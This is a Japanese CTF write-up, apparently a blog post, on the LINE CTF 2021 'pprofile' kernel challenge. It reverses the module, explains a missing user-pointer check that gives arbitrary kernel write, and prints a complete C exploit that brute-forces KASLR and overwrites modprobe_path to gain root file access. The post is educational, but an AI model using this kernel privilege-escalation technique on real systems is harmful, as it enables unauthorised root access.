@@ -1,0 +1,481 @@
+
+<p><script src="https://cdn.rawgit.com/google/code-prettify/master/loader/run_prettify.js?skin=desert"></script></p>
+
+<div class="keywords"><span class="btitle">keywords</span>
+<p>copy_user_generic_unrolled /  pointer validation /  modprobe_path
+</p>
+</div>
+ <!-- KEYWORDS HERE -->
+<div class="contents">[:contents]</div>
+<p> </p>
+<p> </p>
+<p></p>
+<h3>1: イントロ</h3>
+<p>いつぞや開催されたLINE CTF 2021。最近kernel問を解いているのでkernel問を解こうと思って望んだが解けませんでした。このエントリの前半は問題の概要及び自分がインタイムに考えたことをまとめていて、後半で実際に動くexploitの概要を書いています。尚、本exploitは<a href="https://gist.github.com/sampritipanda">@sampritipanda</a>さんの<a href="https://gist.github.com/sampritipanda/3ad8e88f93dd97e93f070a94a791bff6">PoC</a>を完全に参考にしています。というかほぼ写経しています。過去のCTFの問題を復習する時に結構この人のPoCを参考にすることが多いので、いつもかなり感謝しています。</p>
+<p>今回、振り返ってみるとかなり明らかな、自明と言うか、誘っているようなバグがあったにも関わらず全然気づけなかったので、反省しています。嘘です。コーラ飲んでます。</p>
+<p></p>
+<h3>2: static</h3>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">static.sh</div>
+<pre class="prettyprint linenums lang-sh">
+/ $ cat /proc/version
+Linux version 5.0.9 (ubuntu@ubuntu) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.11)) #1 SMP 9
+$ cat ./run
+qemu-system-x86_64 -cpu kvm64,+smep,+smap \
+  -m 128M \
+  -kernel ./bzImage \
+  -initrd ./initramfs.cpio \
+  -nographic \
+  -monitor /dev/null \
+  -no-reboot \
+  -append &quot;root=/dev/ram rw rdinit=/root/init console=ttyS0 loglevel=3 oops=panic panic=1&quot;
+$ modinfo ./pprofile.ko
+filename:       /home/wataru/Documents/ctf/line2021/pprofile/work/./pprofile.ko
+license:        GPL
+author:         pprofile
+srcversion:     35894B85C84616BDF4E3CE4
+depends:
+retpoline:      Y
+name:           pprofile
+vermagic:       5.0.9 SMP mod_unload modversions
+</pre>
+<p>SMEP有効・SMAP有効・KAISER有効・KASLR有効・oops-&gt;panic・シングルコアSMP。ソース配布なし。</p>
+<p></p>
+<h3>3: Module</h3>
+<p><code>ioctl</code>のみを実装したデバイスを登録している。コマンドは3つ存在し、それぞれ大凡以下のことをする。</p>
+<p></p>
+<h4>PP_REGISTER: 0x20</h4>
+<p>クエリは以下の構造。また、内部では2つの構造体が使われる。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">query.c</div>
+<pre class="prettyprint linenums lang-c">
+struct ioctl_query{
+    char *comm;
+    char *result;
+}
+struct unk1{
+    char *comm;
+    struct unk2 *ptr;
+}
+struct unk2{
+    ulong NOT_USED;
+    uint pid;
+    uint length;
+}
+struct unk1 storages[0x10]; // global
+</pre>
+<p>ユーザから指定された<code>comm</code>が<code>storages</code>に存在していなければ新しく<code>unk1</code>と<code>unk2</code>を<code>kmalloc/kmem_cache_alloc_trace()</code>で確保し、callerのPIDや指定された<code>comm</code>及びそのlengthを格納する。この際に、<code>comm</code>のlengthに応じて以下の謎の処理があるが、これが何をしているかは分からなかった。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">unk_source.c</div>
+<pre class="prettyprint linenums lang-c">
+    else {
+      uVar5 = (uint)offset;
+                    /* n &lt;= 6 */
+      if (uVar5 &lt; 0x8) {
+        if ((offset &amp; 0x4) == 0x0) {
+                    /* n &lt;= 3 */
+          if ((uVar5 != 0x0) &amp;&amp; (*__dest = &#x27;\0&#x27;, (offset &amp; 0x2) != 0x0)) {
+            *(undefined2 *)(__dest + ((offset &amp; 0xffffffff) - 0x2)) = 0x0;
+          }
+        }
+        else {
+                    /* 4 &lt;= n &lt;= 6 */
+          *(undefined4 *)__dest = 0x0;
+          *(undefined4 *)(__dest + ((offset &amp; 0xffffffff) - 0x4)) = 0x0;
+        }
+      }
+      else {
+                    /* n == 7 */
+        *(undefined8 *)(__dest + ((offset &amp; 0xffffffff) - 0x8)) = 0x0;
+        if (0x7 &lt; uVar5 - 0x1) {
+          uVar4 = 0x0;
+          do {
+            offset = (ulong)uVar4;
+            uVar4 = uVar4 + 0x8;
+            *(undefined8 *)(__dest + offset) = 0x0;
+          } while (uVar4 &lt; (uVar5 - 0x1 &amp; 0xfffffff8));
+        }
+      }
+</pre>
+<p></p>
+<h4>PP_DESTROY: 0x40</h4>
+<p><code>storages</code>から指定された<code>comm</code>を持つエントリを探して、<code>kfree()</code>及びNULLクリアするのみ。</p>
+<p></p>
+<h4>PP_ASK: 0x10</h4>
+<p>指定された<code>comm</code>に該当する<code>storages</code>のエントリの<code>unk2</code>構造体が持つ値を、指定された<code>query.result</code>にコピーする。このコピーでは以下のように<code>put_user_size()</code>という関数が使われている。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">pp_ask.c</div>
+<pre class="prettyprint linenums lang-c">
+                    /* Found specified entry */
+            uVar5 = unk1-&gt;info2-&gt;pid;
+            uVar4 = unk1-&gt;info2-&gt;length;
+            put_user_size(NULL,l58_query.result,0x4);
+            iVar2 = extraout_EAX;
+            if ((extraout_EAX != 0x0) ||
+               (put_user_size((char *)(ulong)uVar5,comm + 0x8,0x4), iVar2 = extraout_EAX_00,
+               extraout_EAX_00 != 0x0)) goto LAB_001001a0;
+            put_user_size((char *)(ulong)uVar4,comm + 0xc,0x4);
+</pre>
+<p>この関数は、内部で<code>copy_user_generic_unrolled()</code>という関数を用いてコピーを行っている。この関数の存在を知らなかったのだが、<code>/arch/x86/lib/copy_user_64.S</code>でアセンブラで書かれた関数でuserlandに対するコピーを行うらしい。先頭にある<code>STAC</code>命令は一時的にSMAPを無効にする命令である。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">copy_user_64.S</div>
+<pre class="prettyprint linenums lang-S">
+ENTRY(copy_user_generic_unrolled)
+	ASM_STAC
+	cmpl $8,%edx
+	jb 20f		/* less then 8 bytes, go to byte copy loop */
+	ALIGN_DESTINATION
+	movl %edx,%ecx
+	andl $63,%edx
+	shrl $6,%ecx
+	jz .L_copy_short_string
+1:	movq (%rsi),%r8
+(snipped...)
+</pre>
+<p> <strong>この時点で、明らかにこれが自明なバグであることに気づくべきだった</strong> 。まぁ、後述。</p>
+<p></p>
+<p></p>
+<h3>4: 期間中に考えたこと(FAIL)</h3>
+<p>絶対にレースだと思ってた。というのも、リバースしたコードが、それはもうTOCTOU臭が漂いまくっていた。いや、本当は漂ってなかったかも知れないが、絶対そうだと思いこんでいた。一番有力なのは以下の部分だと思ってた。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">sus.c</div>
+<pre class="prettyprint linenums lang-c">
+      if (command == 0x10) {
+        iVar2 = strncpy_from_user(&amp;l41_user_comm,l58_query.userbuf,0x8);
+        if ((iVar2 == 0x0) || (iVar2 == 0x9)) goto LAB_00100341;
+        if (iVar2 &lt; 0x0) goto LAB_001001a0;
+        p_storage = storages;
+        do {
+          unk1 = *p_storage;
+          if ((unk1 != NULL) &amp;&amp;
+             (iVar2 = strcmp(unk1-&gt;comm,(char *)&amp;l41_user_comm), comm = l58_query.result,
+             iVar2 == 0x0)) {
+                    /* Found specified entry */
+            uVar5 = unk1-&gt;info2-&gt;pid;
+            uVar4 = unk1-&gt;info2-&gt;length;
+            put_user_size(NULL,l58_query.result,0x4);
+            iVar2 = extraout_EAX;
+            if ((extraout_EAX != 0x0) ||
+               (put_user_size((char *)(ulong)uVar5,comm + 0x8,0x4), iVar2 = extraout_EAX_00,
+               extraout_EAX_00 != 0x0)) goto LAB_001001a0;
+            put_user_size((char *)(ulong)uVar4,comm + 0xc,0x4);
+</pre>
+<p>userから指定された<code>comm</code>を<code>strncpy_from_user()</code>でコピーした後に、合致するエントリがあるかを<code>storages</code>から探し、見つかったならばその結果を<code>query.result</code>にコピーしている。ここだけが唯一<code>storages</code>からの検索後にもユーザランドへのアクセスがあったため、ここでuffdしてTOCTOUするものだと思った。処理を止めている間に該当エントリを<code>PP_DESTROY</code>して何か他のオブジェクトを入れた後にreadするんじゃないかと思った。だが、実際の処理ではユーザアクセス(<code>put_user_size()</code>)の前にpidとlengthをスタックに積んでいるため、少なくともuffdによるレースは失敗する。なんかうまいこと<code>storages</code>の検索後からスタックに積むまでの間に処理が移ったら良いんじゃないかとも思ったが、だいぶしんどそう。しかも、この方法だとleakができたとしてもwriteする手段がないためどっちにしろ詰むことになったと思う。</p>
+<p>レースの線に固執しすぎていたのと、あと単純にリバースが下手でバイナリを読み間違えていたのもあって、解けなかった。</p>
+<p></p>
+<h3>5: Vuln</h3>
+<p>以下、完全に<a href="https://gist.github.com/sampritipanda">@sampritipanda</a>さんの<a href="https://gist.github.com/sampritipanda/3ad8e88f93dd97e93f070a94a791bff6">PoC</a>をパクっています。</p>
+<p>上述したが、ユーザランドへのコピーに<code>copy_user_generic_unrolled()</code>を使っている。この関数のことを読み飛ばしていたのだが、kernelを読んでみると、この関数はCPUが<code>rep movsq</code>等の効率的なコピーに必要な命令のマイクロコードをサポートしていない場合に呼ばれる関数らしい。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">uaccess_64.h</div>
+<pre class="prettyprint linenums lang-h">
+copy_user_generic(void *to, const void *from, unsigned len)
+{
+	unsigned ret;
+
+	/*
+	 * If CPU has ERMS feature, use copy_user_enhanced_fast_string.
+	 * Otherwise, if CPU has rep_good feature, use copy_user_generic_string.
+	 * Otherwise, use copy_user_generic_unrolled.
+	 */
+	alternative_call_2(copy_user_generic_unrolled,
+			 copy_user_generic_string,
+			 X86_FEATURE_REP_GOOD,
+			 copy_user_enhanced_fast_string,
+			 X86_FEATURE_ERMS,
+			 ASM_OUTPUT2(&quot;=a&quot; (ret), &quot;=D&quot; (to), &quot;=S&quot; (from),
+				     &quot;=d&quot; (len)),
+			 &quot;1&quot; (to), &quot;2&quot; (from), &quot;3&quot; (len)
+			 : &quot;memory&quot;, &quot;rcx&quot;, &quot;r8&quot;, &quot;r9&quot;, &quot;r10&quot;, &quot;r11&quot;);
+	return ret;
+}
+</pre>
+<p>そして、この<code>copy_user_generic()</code>自体は通常の<code>copy_from_user()</code>から呼ばれる関数である。(<code>raw_copy_from_user()</code>経由)</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">usercopy.c</div>
+<pre class="prettyprint linenums lang-c">
+unsigned long _copy_from_user(void *to, const void __user *from, unsigned long n)
+{
+	unsigned long res = n;
+	might_fault();
+	if (likely(access_ok(from, n))) {
+		kasan_check_write(to, n);
+		res = raw_copy_from_user(to, from, n);
+	}
+	if (unlikely(res))
+		memset(to + (n - res), 0, res);
+	return res;
+}
+EXPORT_SYMBOL(_copy_from_user);
+</pre>
+<p>はい。上の関数を見れば分かるが、<code>raw_copy_from_user()</code>を呼び出す前には<code>access_ok()</code>を呼んで、指定されたユーザランドポインタがvalidなものであるかをチェックする必要がある。つまり、<code>copy_user_generic_unrolled()</code>自体はこのチェックが既に済んでおり、ポインタはvalidなものとして扱う。よって、 <strong>query.resultにkernellandのポインタを渡してしまえばAAWが実現される</strong> 。</p>
+<p></p>
+<h3>6: 方針</h3>
+<p><code>PP_ASK</code>で書き込まれる値は、<code>comm</code>の<code>length</code>・PID、及び使用されていない常に0の8byteである(これナニ？)。この内<code>comm</code>はlengthが1~7に限定されているため、任意に操作できるのはPIDだけである。<code>fork()</code>を所望のPIDになるまで繰り返せば任意の値を書き込むことができる。</p>
+<p>任意書き込みができる場合に一番楽なのは<code>modprobe_path</code>である。この際、KASLRが有効だからleakしなくちゃいけないと思ったら、意外とbruteforceでなんとかなるらしい。エントロピーは、以下の試行でも分かるように1byteのみである。 <strong>readのbruteforceならまだしも、writeのbruteforceでも意外とkernelはcrashしないらしい</strong> 。勉強になった。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">ex.txt</div>
+<pre class="prettyprint linenums lang-txt">
+ffffffff82256f40 D modprobe_path
+ffffffff90256f40 D modprobe_path
+ffffffff96256f40 D modprobe_path
+</pre>
+<p></p>
+<h3>7: exploit</h3>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">exploit.c</div>
+<pre class="prettyprint linenums lang-c">
+
+/** This PoC is completely based on https://gist.github.com/sampritipanda/3ad8e88f93dd97e93f070a94a791bff6 **/
+
+#define _GNU_SOURCE
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;assert.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;poll.h&gt;
+#include &lt;pthread.h&gt;
+#include &lt;err.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;sched.h&gt;
+#include &lt;linux/bpf.h&gt;
+#include &lt;linux/filter.h&gt;
+#include &lt;linux/userfaultfd.h&gt;
+#include &lt;linux/prctl.h&gt;
+#include &lt;sys/syscall.h&gt;
+#include &lt;sys/ipc.h&gt;
+#include &lt;sys/msg.h&gt;
+#include &lt;sys/prctl.h&gt;
+#include &lt;sys/ioctl.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/xattr.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;sys/uio.h&gt;
+#include &lt;sys/shm.h&gt;
+
+
+// commands
+#define DEV_PATH &quot;/dev/pprofile&quot;   // the path the device is placed
+
+// constants
+#define PAGE 0x1000
+#define FAULT_ADDR 0xdead0000UL
+#define FAULT_OFFSET PAGE
+#define MMAP_SIZE 4*PAGE
+#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
+// (END constants)
+
+// globals
+// (END globals)
+
+
+// utils
+#define WAIT getc(stdin);
+#define ulong unsigned long
+#define scu static const unsigned long
+#define NULL (void*)0
+#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
+                        } while (0)
+#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
+                        if(msgsnd(qid, &amp;msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) errExit(&quot;KMALLOC&quot;);}
+ulong user_cs,user_ss,user_sp,user_rflags;
+struct pt_regs {
+	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
+	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
+	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
+	ulong orig_ax; ulong ip; ulong cs; ulong flags;
+  ulong sp; ulong ss;
+};
+void print_regs(struct pt_regs *regs)
+{
+  printf(&quot;r15: %lx r14: %lx r13: %lx r12: %lx\n&quot;, regs-&gt;r15, regs-&gt;r14, regs-&gt;r13, regs-&gt;r12);
+  printf(&quot;bp: %lx bx: %lx r11: %lx r10: %lx\n&quot;, regs-&gt;bp, regs-&gt;bx, regs-&gt;r11, regs-&gt;r10);
+  printf(&quot;r9: %lx r8: %lx ax: %lx cx: %lx\n&quot;, regs-&gt;r9, regs-&gt;r8, regs-&gt;ax, regs-&gt;cx);
+  printf(&quot;dx: %lx si: %lx di: %lx ip: %lx\n&quot;, regs-&gt;dx, regs-&gt;si, regs-&gt;di, regs-&gt;ip);
+  printf(&quot;cs: %lx flags: %lx sp: %lx ss: %lx\n&quot;, regs-&gt;cs, regs-&gt;flags, regs-&gt;sp, regs-&gt;ss);
+}
+void NIRUGIRI(void)
+{
+  char *argv[] = {&quot;/bin/sh&quot;,NULL};
+  char *envp[] = {NULL};
+  execve(&quot;/bin/sh&quot;,argv,envp);
+}
+// should compile with -masm=intel
+static void save_state(void) {
+  asm(
+      &quot;movq %0, %%cs\n&quot;
+      &quot;movq %1, %%ss\n&quot;
+      &quot;movq %2, %%rsp\n&quot;
+      &quot;pushfq\n&quot;
+      &quot;popq %3\n&quot;
+      : &quot;=r&quot; (user_cs), &quot;=r&quot; (user_ss), &quot;=r&quot;(user_sp), &quot;=r&quot; (user_rflags) : : &quot;memory&quot; 		);
+}
+
+static void shellcode(void){
+  asm(
+    &quot;xor rdi, rdi\n&quot;
+    &quot;mov rbx, QWORD PTR [rsp+0x50]\n&quot;
+    &quot;sub rbx, 0x244566\n&quot;
+    &quot;mov rcx, rbx\n&quot;
+    &quot;call rcx\n&quot;
+    &quot;mov rdi, rax\n&quot;
+    &quot;sub rbx, 0x470\n&quot;
+    &quot;call rbx\n&quot;
+    &quot;add rsp, 0x20\n&quot;
+    &quot;pop rbx\n&quot;
+    &quot;pop r12\n&quot;
+    &quot;pop r13\n&quot;
+    &quot;pop r14\n&quot;
+    &quot;pop r15\n&quot;
+    &quot;pop rbp\n&quot;
+    &quot;ret\n&quot;
+  );
+}
+// (END utils)
+
+/*** GLOBALS *****/
+void *mmap_addr;
+int fd;
+char inbuf[PAGE];
+char outbuf[PAGE];
+/********************/
+
+#define PP_REGISTER 0x20
+#define PP_DESTROY 0x40
+#define PP_ASK 0x10
+
+struct query{
+  char *buf;
+  char *result;
+};
+
+void _register(int fd, char *buf){
+  printf(&quot;[.] register: %d %p(%s)\n&quot;, fd, buf, buf);
+  struct query q = {
+      .buf = buf};
+  int ret = ioctl(fd, PP_REGISTER, &amp;q);
+  printf(&quot;[reg] %d\n&quot;, ret);
+}
+
+void _destroy(int fd, char *buf){
+  printf(&quot;[.] destroy: %d %p(%s)\n&quot;, fd, buf, buf);
+  struct query q = {
+      .buf = buf
+  };
+  int ret = ioctl(fd, PP_DESTROY, &amp;q);
+  printf(&quot;[des] %d\n&quot;, ret);
+}
+
+void _ask(int fd, char *buf, char *obuf){
+  printf(&quot;[.] ask: %d %p %p\n&quot;, fd, buf, obuf);
+  struct query q = {
+      .buf = buf,
+      .result = obuf
+  };
+  int ret = ioctl(fd, PP_ASK, &amp;q);
+  printf(&quot;[ask] %d\n&quot;, ret);
+}
+
+void ack_pid(int pid, void (*f)(ulong), ulong arg){
+  while(1==1){
+    int cur = fork();
+    if(cur == 0){ // child
+      if(getpid() % 0x100 == 0){
+        printf(&quot;[-] 0x%x\n&quot;, getpid());
+      }
+      if(getpid() == pid){
+        f(arg);
+      }
+      exit(0);
+    }else{ // parent
+      wait(NULL);
+      if(cur == pid)
+        break;
+    }
+  }
+}
+
+void sub_aaw(ulong offset){
+  for (int ix = 0; ix != 0xFF; ++ix){
+    ulong target = 0xffffffff00000000UL
+                    + ix * 0x01000000UL
+                    + offset;
+    _register(fd, inbuf);
+    _ask(fd, inbuf, (char *)target);
+    _destroy(fd, inbuf);
+  }
+}
+
+void aaw(ulong offset, unsigned val){
+  ack_pid(val, &amp;sub_aaw, offset);
+}
+
+int main(int argc, char *argv[]) {
+  char s_evil[] = &quot;/tmp/a\x00&quot;;
+  memset(inbuf, 0, 0x200);
+  memset(outbuf, 0, 0x200);
+  strcpy(inbuf, &quot;ABC\x00&quot;);
+  fd = open(DEV_PATH, O_RDONLY);
+  assert(fd &gt;= 2);
+
+  // setup for modprobe_path overwrite
+  system(&quot;echo -ne &#x27;#!/bin/sh\nchmod 777 /root/flag&#x27; &gt; /tmp/a&quot;);
+  system(&quot;chmod +x /tmp/a&quot;);
+  system(&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/nirugiri&quot;);
+  system(&quot;chmod +x /tmp/nirugiri&quot;);
+
+  for(int ix=0;ix&lt;strlen(s_evil);ix+=2){
+    printf(&quot;[+] writing %x.......\n&quot;, *((unsigned short*)(s_evil+ix)));
+    aaw(0x256f40 - 0x10 + 8 + ix, *((unsigned short*)(s_evil+ix)));
+  }
+
+  // invoke user_mod_helper
+  system(&quot;/tmp/nirugiri&quot;);
+
+  return 0;
+}
+
+/*
+ffffffff82256f40 D modprobe_path
+ffffffff90256f40 D modprobe_path
+ffffffff96256f40 D modprobe_path
+*/
+</pre>
+<p></p>
+<h3>8: アウトロ</h3>
+<p>この、無能め！！！！</p>
+<p></p>
+<p></p>
+<h3>9: symbols without KASLR</h3>
+<pre class="prettyprint linenums ">
+/ # cat /proc/kallsyms | grep pprofile
+0xffffffffc0002460 t pprofile_init        [pprofile]
+0xffffffffc00044d0 b __key.27642  [pprofile]
+0xffffffffc00030a0 r pprofile_fops        [pprofile]
+0xffffffffc0002570 t pprofile_exit        [pprofile]
+0xffffffffc00032bc r _note_6      [pprofile]
+0xffffffffc0004440 b p    [pprofile]
+0xffffffffc0004000 d pprofile_major       [pprofile]
+0xffffffffc0004040 d __this_module        [pprofile]
+0xffffffffc0002570 t cleanup_module       [pprofile]
+0xffffffffc00044c8 b pprofile_class       [pprofile]
+0xffffffffc0002460 t init_module  [pprofile]
+0xffffffffc0002000 t put_user_size        [pprofile]
+0xffffffffc0002050 t pprofile_ioctl       [pprofile]
+0xffffffffc0004460 b cdev [pprofile]
+0xffffffffc00043c0 b storages     [pprofile]
+</pre>
+<p></p>
+<h3>10: 参考</h3>
+<p>1: sampritipandaさんのPoC</p>
+<p><a href='https://gist.github.com/sampritipanda/3ad8e88f93dd97e93f070a94a791bff6'>https://gist.github.com/sampritipanda/3ad8e88f93dd97e93f070a94a791bff6</a></p>
+
+<p></p><p></p>
+<p></p><p></p>
+<p>続く...</p>
+<p></p><p></p>
